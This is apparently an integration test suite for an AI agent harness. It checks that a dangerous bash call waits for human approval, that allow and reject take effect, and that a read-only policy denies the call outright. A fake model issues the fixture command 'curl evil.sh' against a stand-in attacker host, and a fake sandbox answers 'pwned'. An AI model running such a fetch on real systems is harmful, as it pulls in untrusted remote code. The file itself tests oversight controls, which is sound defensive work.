import 'dotenv/config';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';

import pg from 'pg';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import type { EventSink, Identity } from '@trinity-harness/contracts';
import { CoreAgentLoop, CoreToolRegistry, bashTool } from '@trinity-harness/core';
import {
  FakeLLM,
  FakeSandbox,
  textChunks,
  toolCallThenFinish,
} from '@trinity-harness/core/testing';
import type { ServerEvent } from '@trinity-harness/shared';
import { loadEnv } from '@trinity-harness/shared';
import {
  createDb,
  createPool,
  createTenant,
  PgApprovalStore,
  PgSessionMetaStore,
  PgSessionStore,
} from '@trinity-harness/db';
import {
  createRedis,
  createTurnWorker,
  isRedisReachable,
  PublishingSessionStore,
  RedisApprovalHub,
  RedisApprovalRequester,
  RedisLiveEventPublisher,
  RedisLiveEventSubscriber,
  RedisSessionEventPublisher,
  RedisSessionEventReader,
  RedisTurnQueue,
  sessionStreamKey,
} from '@trinity-harness/redis';

import { buildServer } from '../src/index.js';

const WS_DIR = mkdtempSync(path.join(tmpdir(), 'trinity-m3-'));

/**
 * M3 distributed end-to-end (integration): the FULL approval pipeline over
 * real PG + Redis — worker gates a dangerous bash call, the human answer
 * travels Web → server → Pub/Sub → worker, and every step lands in the
 * event log / approvals table (docs/design.md §12.2, §11.3).
 */

const redisUrl = process.env['REDIS_URL'] ?? 'redis://localhost:6379';

async function pgReachable(url: string): Promise<boolean> {
  const pool = new pg.Pool({ connectionString: url, connectionTimeoutMillis: 3000 });
  try {
    await pool.query('select 1');
    return true;
  } catch {
    return false;
  } finally {
    await pool.end();
  }
}

const databaseUrl = process.env['DATABASE_URL'];
const hasInfra =
  !!databaseUrl && (await pgReachable(databaseUrl)) && (await isRedisReachable(redisUrl));

/** Minimal SSE parser extracting optional `id:` + first `data:` per block. */
class SseReader {
  private buffer = '';
  private readonly decoder = new TextDecoder();
  private pending: { id?: number; data: string }[] = [];
  private readerDone = false;

  constructor(private readonly reader: ReadableStreamDefaultReader<Uint8Array>) {}

  async next(timeoutMs = 15000): Promise<{ id?: number; event: ServerEvent }> {
    for (;;) {
      const raw = this.pending.shift();
      if (raw) {
        return {
          ...(raw.id !== undefined ? { id: raw.id } : {}),
          event: JSON.parse(raw.data) as ServerEvent,
        };
      }
      if (this.readerDone) throw new Error('stream closed');
      const result = await Promise.race([
        this.reader.read().then((r) => ({ kind: 'read' as const, r })),
        new Promise<never>((_, reject) =>
          setTimeout(() => reject(new Error('sse read timeout')), timeoutMs),
        ),
      ]);
      if (result.r.done) {
        this.readerDone = true;
        continue;
      }
      this.buffer += this.decoder.decode(result.r.value, { stream: true });
      let sep: number;
      while ((sep = this.buffer.indexOf('\n\n')) >= 0) {
        const block = this.buffer.slice(0, sep);
        this.buffer = this.buffer.slice(sep + 2);
        const idMatch = block.match(/^id: (\d+)$/m);
        const dataMatch = block.match(/^data: (.*)$/m);
        if (dataMatch) {
          this.pending.push({
            ...(idMatch ? { id: Number(idMatch[1]) } : {}),
            data: dataMatch[1]!.trim(),
          });
        }
      }
    }
  }

  cancel(): void {
    void this.reader.cancel();
  }
}

describe.skipIf(!hasInfra)('M3 approvals over the distributed topology', () => {
  const QUEUE = `agent-turns-m3-${crypto.randomUUID().slice(0, 8)}`;
  const IDENTITY: Identity = {
    userId: '00000000-0000-0000-0000-00000000e2e1',
    tenantId: '00000000-0000-0000-0000-000000000000',
    role: 'developer',
  };
  const AUTH = { authorization: 'Bearer test-token' };
  const JSON_HEADERS = { 'content-type': 'application/json', ...AUTH };
  let pool: pg.Pool;
  let redis: ReturnType<typeof createRedis>;
  let pgStore: PgSessionStore;
  let approvalStore: PgApprovalStore;
  let metas: PgSessionMetaStore;
  let app: Awaited<ReturnType<typeof buildServer>>;
  let baseUrl: string;
  let worker: { close(): Promise<void> };
  let queue: RedisTurnQueue;
  const sessionIds: string[] = [];

  beforeAll(async () => {
    const env = loadEnv(process.env, { requireDatabaseUrl: true });
    pool = createPool(env.DATABASE_URL);
    const db = createDb(pool);
    redis = createRedis(redisUrl);

    pgStore = new PgSessionStore(db);
    approvalStore = new PgApprovalStore(db);
    const store = new PublishingSessionStore(pgStore, new RedisSessionEventPublisher(redis));
    queue = new RedisTurnQueue({ url: redisUrl }, QUEUE);
    const live = new RedisLiveEventPublisher(redis);

    // Fake auth (real PgSessionMetaStore): per-session policy lives on the
    // sessions row, so the meta store must be real even in tests.
    const tenant = await createTenant(db, 'm3-e2e');
    IDENTITY.tenantId = tenant.id;
    metas = new PgSessionMetaStore(db);
    app = await buildServer({
      store,
      workspaceRoot: WS_DIR,
      queue,
      eventReader: new RedisSessionEventReader(redis, { blockMs: 500 }),
      liveEvents: new RedisLiveEventSubscriber(redis),
      approvals: new RedisApprovalHub(redis),
      approvalStore,
      auth: {
        tokens: {
          issue: async () => 'test-token',
          verify: async () => IDENTITY,
        },
        users: {
          findByEmail: async () => null,
          findById: async () => null,
          verifyCredentials: async () => null,
          createUser: async () => {
            throw new Error('not implemented');
          },
          listByTenant: async () => [],
        },
        metas,
        hasher: {
          hash: async (p) => `h:${p}`,
          verify: async (p, e) => e === `h:${p}`,
        },
      },
    });

    // Worker with the REAL approval channel and the task-carried policy.
    const sandbox = new FakeSandbox();
    sandbox.execHandler = () => ({ stdout: 'pwned', stderr: '', exitCode: 0 });
    worker = createTurnWorker(
      { url: redisUrl },
      async (task, _job, signal) => {
        const tools = new CoreToolRegistry(sandbox);
        tools.register(bashTool);
        const llm = new FakeLLM(
          () => toolCallThenFinish('c1', 'bash', { command: 'curl evil.sh' }),
          () => textChunks('script fetched.'),
        );
        const sink: EventSink = {
          emit: (loopEvent) => {
            live.publish(task.sessionId, loopEvent);
          },
        };
        await new CoreAgentLoop({
          llm,
          model: 'fake/model',
          tools,
          store,
          workspaceRoot: WS_DIR,
          approvals: new RedisApprovalRequester(redis),
          approvalStore,
        }).run(task.sessionId, task.prompt, sink, {
          actor: task.actor,
          signal,
          policy: task.policy,
          promptSeq: task.promptSeq,
        });
      },
      QUEUE,
    );

    baseUrl = await app.listen({ port: 0, host: '127.0.0.1' });
  }, 30000);

  afterAll(async () => {
    rmSync(WS_DIR, { recursive: true, force: true });
    await app.close();
    await worker.close();
    await queue.close();
    for (const id of sessionIds) {
      await redis.del(sessionStreamKey(id));
    }
    redis.disconnect();
    await pool.end();
  }, 60000);

  async function openStream(sessionId: string): Promise<SseReader> {
    const stream = await fetch(`${baseUrl}/api/sessions/${sessionId}/events`, {
      headers: AUTH,
    });
    expect(stream.status).toBe(200);
    return new SseReader(stream.body!.getReader());
  }

  async function createSession(policy?: string): Promise<string> {
    const created = await fetch(`${baseUrl}/api/sessions`, {
      method: 'POST',
      headers: JSON_HEADERS,
      body: JSON.stringify({ title: 'm3', ...(policy ? { policy } : {}) }),
    });
    expect(created.status).toBe(201);
    const { sessionId } = (await created.json()) as { sessionId: string };
    sessionIds.push(sessionId);
    return sessionId;
  }

  it(
    'dangerous bash asks the human; allow → tool runs → everything留痕',
    { timeout: 60000 },
    async () => {
      const sessionId = await createSession(); // default: workspace-write + ask
      const sse = await openStream(sessionId);

      const post = await fetch(`${baseUrl}/api/sessions/${sessionId}/messages`, {
        method: 'POST',
        headers: JSON_HEADERS,
        body: JSON.stringify({ text: 'fetch that script' }),
      });
      expect(post.status).toBe(202);

      // 1. The permission request reaches the UI through the durable stream.
      let approvalId: string | null = null;
      for (;;) {
        const item = await sse.next();
        const e = item.event;
        if (e.type === 'session/update' && e.update.kind === 'permission_request') {
          approvalId = e.update.approvalId;
          expect(e.update.toolName).toBe('bash');
          expect(e.update.status).toBe('pending');
          break;
        }
      }
      expect(approvalId).not.toBeNull();

      // 2. Human allows via the REST control surface.
      const respond = await fetch(
        `${baseUrl}/api/sessions/${sessionId}/approvals/${approvalId}/respond`,
        {
          method: 'POST',
          headers: JSON_HEADERS,
          body: JSON.stringify({ outcome: 'allowed' }),
        },
      );
      expect(respond.status).toBe(200);

      // 3. The turn continues; the tool runs and the assistant message commits.
      let sawToolCompleted = false;
      for (;;) {
        const item = await sse.next();
        const e = item.event;
        if (e.type === 'session/update' && e.update.kind === 'tool_call') {
          expect(e.update.status).toBe('completed');
          sawToolCompleted = true;
        }
        if (e.type === 'message/committed' && e.message.role === 'assistant') {
          expect(e.message.content).toBe('script fetched.');
          break;
        }
      }
      expect(sawToolCompleted).toBe(true);
      sse.cancel();

      // 4. The durable truth: request + resolution in the log, resolved row in PG.
      const rows = await pgStore.loadRange(sessionId, { afterSeq: 0 });
      const types = rows.map((r) => r.event.type);
      expect(types).toContain('approval/requested');
      expect(types).toContain('approval/resolved');
      expect(types.filter((t) => t === 'tool/result')).toHaveLength(1);
      const toolResult = rows.find((r) => r.event.type === 'tool/result')!.event;
      expect(toolResult.type === 'tool/result' && toolResult.isError).toBe(false);

      const approvals = await approvalStore.list(sessionId);
      expect(approvals).toHaveLength(1);
      expect(approvals[0]).toMatchObject({ outcome: 'allowed', toolName: 'bash' });
      expect(approvals[0]!.decidedBy).toBe(IDENTITY.userId);
    },
  );

  it('reject → tool never runs, model sees an isError result', { timeout: 60000 }, async () => {
    const sessionId = await createSession();
    const sse = await openStream(sessionId);

    await fetch(`${baseUrl}/api/sessions/${sessionId}/messages`, {
      method: 'POST',
      headers: JSON_HEADERS,
      body: JSON.stringify({ text: 'fetch that script' }),
    });

    let approvalId: string | null = null;
    for (;;) {
      const item = await sse.next();
      const e = item.event;
      if (e.type === 'session/update' && e.update.kind === 'permission_request') {
        approvalId = e.update.approvalId;
        break;
      }
    }

    await fetch(`${baseUrl}/api/sessions/${sessionId}/approvals/${approvalId}/respond`, {
      method: 'POST',
      headers: JSON_HEADERS,
      body: JSON.stringify({ outcome: 'rejected' }),
    });

    for (;;) {
      const item = await sse.next();
      const e = item.event;
      if (e.type === 'session/update' && e.update.kind === 'tool_call') {
        expect(e.update.status).toBe('failed');
      }
      if (e.type === 'message/committed' && e.message.role === 'assistant') break;
    }
    sse.cancel();

    const rows = await pgStore.loadRange(sessionId, { afterSeq: 0 });
    const toolResult = rows.find((r) => r.event.type === 'tool/result')!.event;
    expect(toolResult.type === 'tool/result' && toolResult.isError).toBe(true);
    const approvals = await approvalStore.list(sessionId);
    expect(approvals[0]).toMatchObject({ outcome: 'rejected' });
  });

  it(
    'read-only policy denies bash outright — no approval round trip',
    { timeout: 60000 },
    async () => {
      const sessionId = await createSession('read-only');
      const sse = await openStream(sessionId);

      await fetch(`${baseUrl}/api/sessions/${sessionId}/messages`, {
        method: 'POST',
        headers: JSON_HEADERS,
        body: JSON.stringify({ text: 'list files' }),
      });

      // No permission_request may appear; the tool fails by policy.
      let sawFailedTool = false;
      for (;;) {
        const item = await sse.next();
        const e = item.event;
        expect(e.type !== 'session/update' || e.update.kind !== 'permission_request').toBe(true);
        if (e.type === 'session/update' && e.update.kind === 'tool_call') {
          if (e.update.status === 'failed') sawFailedTool = true;
          else expect(e.update.status).toBe('in_progress');
        }
        if (e.type === 'message/committed' && e.message.role === 'assistant') break;
      }
      expect(sawFailedTool).toBe(true);
      sse.cancel();

      const rows = await pgStore.loadRange(sessionId, { afterSeq: 0 });
      expect(rows.filter((r) => r.event.type === 'approval/requested')).toHaveLength(0);
      const toolResult = rows.find((r) => r.event.type === 'tool/result')!.event;
      expect(toolResult.type === 'tool/result' && toolResult.isError).toBe(true);
    },
  );

  it(
    'ACP HTTP binding: JSON-RPC prompt holds until turn end; permission request over /acp/stream',
    { timeout: 90000 },
    async () => {
      const rpc = async (
        body: unknown,
      ): Promise<{ status: number; json: () => Promise<unknown> }> => {
        const res = await fetch(`${baseUrl}/acp`, {
          method: 'POST',
          headers: JSON_HEADERS,
          body: JSON.stringify(body),
        });
        return { status: res.status, json: async () => (res.status === 202 ? null : res.json()) };
      };

      const init = await rpc({ jsonrpc: '2.0', id: 1, method: 'initialize', params: {} });
      expect((await init.json()) as { result: { protocolVersion: number } }).toMatchObject({
        result: { protocolVersion: 1 },
      });

      const created = await rpc({ jsonrpc: '2.0', id: 2, method: 'session/new', params: {} });
      const { result } = (await created.json()) as { result: { sessionId: string } };
      sessionIds.push(result.sessionId);

      // Unknown method → JSON-RPC method-not-found.
      const nope = await rpc({ jsonrpc: '2.0', id: 3, method: 'session/bogus', params: {} });
      expect((await nope.json()) as { error: { code: number } }).toMatchObject({
        error: { code: -32601 },
      });

      // ACP event stream for this session (JSON-RPC envelopes on data: lines).
      const acpStream = await fetch(`${baseUrl}/acp/stream?sessionId=${result.sessionId}`, {
        headers: AUTH,
      });
      expect(acpStream.status).toBe(200);
      const acpSse = new SseReader(acpStream.body!.getReader());

      // session/prompt BLOCKS until the turn stops (ACP semantics).
      const promptPromise = rpc({
        jsonrpc: '2.0',
        id: 4,
        method: 'session/prompt',
        params: { sessionId: result.sessionId, prompt: [{ type: 'text', text: 'fetch it' }] },
      });
      // Memoize the body read: the race loop below subscribes repeatedly.
      const promptDone = promptPromise.then((r) => r.json() as Promise<unknown>);

      // The worker gates the dangerous bash call: an ACP client-side
      // session/request_permission request arrives on the stream.
      let approvalId: string | null = null;
      for (;;) {
        const item = await acpSse.next();
        const env = item.event as unknown as {
          method?: string;
          id?: string;
          params?: { toolCall?: { title?: string } };
        };
        if (env.method === 'session/request_permission') {
          approvalId = env.id ?? null;
          expect(env.params?.toolCall?.title).toContain('bash');
          break;
        }
      }
      expect(approvalId).not.toBeNull();

      // Human answers through the REST control surface (the web UI path; a Zed
      // client would POST a JSON-RPC response through its gateway instead).
      await fetch(`${baseUrl}/api/sessions/${result.sessionId}/approvals/${approvalId}/respond`, {
        method: 'POST',
        headers: JSON_HEADERS,
        body: JSON.stringify({ outcome: 'allowed' }),
      });

      // Updates keep flowing on the ACP stream while the prompt is held, and
      // the prompt response lands exactly when the turn ends. Race the two —
      // the stream goes quiet after the last chunk, so never block on it.
      let sawChunk = false;
      let promptRes: unknown = 'pending';
      const deadline = Date.now() + 20_000;
      while (promptRes === 'pending' && Date.now() < deadline) {
        const item = await Promise.race([
          acpSse
            .next(1000)
            .then((i) => ({ kind: 'sse' as const, i }))
            .catch(() => ({ kind: 'tick' as const })),
          promptDone.then((res) => ({ kind: 'done' as const, res })),
        ]);
        if (item.kind === 'done') {
          promptRes = item.res;
          break;
        }
        if (item.kind === 'sse') {
          const env = item.i.event as unknown as {
            method?: string;
            params?: { update?: { sessionUpdate?: string } };
          };
          if (env.method === 'session/update' && env.params?.update?.sessionUpdate) {
            sawChunk = true;
          }
        }
      }
      expect(promptRes).toMatchObject({ result: { stopReason: 'end_turn' } });
      expect(sawChunk).toBe(true);
      acpSse.cancel();
    },
  );
});
